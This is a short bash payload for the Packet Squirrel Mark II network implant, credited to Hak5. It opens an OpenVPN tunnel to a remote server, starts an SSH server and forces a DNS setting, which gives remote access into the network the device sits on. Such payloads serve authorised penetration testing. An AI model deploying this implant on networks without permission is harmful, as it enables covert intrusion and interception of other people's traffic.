#!/bin/bash
# 
# This payload is modified from a payload for the original Packet Squirrel to work on 
# the Packet Squirrel Mark II.
# More info here: https://www.youtube.com/watch?v=OlKztGlt8VA
#
# Title:		OpenVPN-Mkii
# Description:	Create a connection to a VPN-connection to an OpenVPN-server. Optionally: Send traffic from the clients through said tunnel.
# Author: 		Hak5, rf_bandit
# Version:		1.1
# Category: 	remote-access
# Target: 		Any
# Net Mode:		BRIDGE, NAT

# Set to 1 to allow clients to use the VPN
FOR_CLIENTS=0
#

DNS_SERVER="8.8.8.8"

# Cheap hack to set the DNS server
function setdns() {
	while true
	do
		[[ ! $(grep -q "$DNS_SERVER" /tmp/resolv.conf) ]] && {
			echo -e "search lan\nnameserver $DNS_SERVER" > /tmp/resolv.conf
		}
		sleep 5
	done
}

function start() {
	LED SETUP
	DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
	if [ $FOR_CLIENTS = 1 ]; then /usr/bin/NETMODE NAT && /usr/bin/LED G SINGLE; else /usr/bin/NETMODE BRIDGE && /usr/bin/LED Y SINGLE; fi


	sleep 3

	# Make OpenVPN use the local configuration
	uci set openvpn.vpn.config="${DIR}/config.ovpn"
	uci commit

	# Start the OpenVPN server in the background
	/etc/init.d/openvpn start

	# Start SSH Server
	SSH_START
	# Set DNS server
	setdns &

	#LED ATTACK
}

# Start the payload
start &
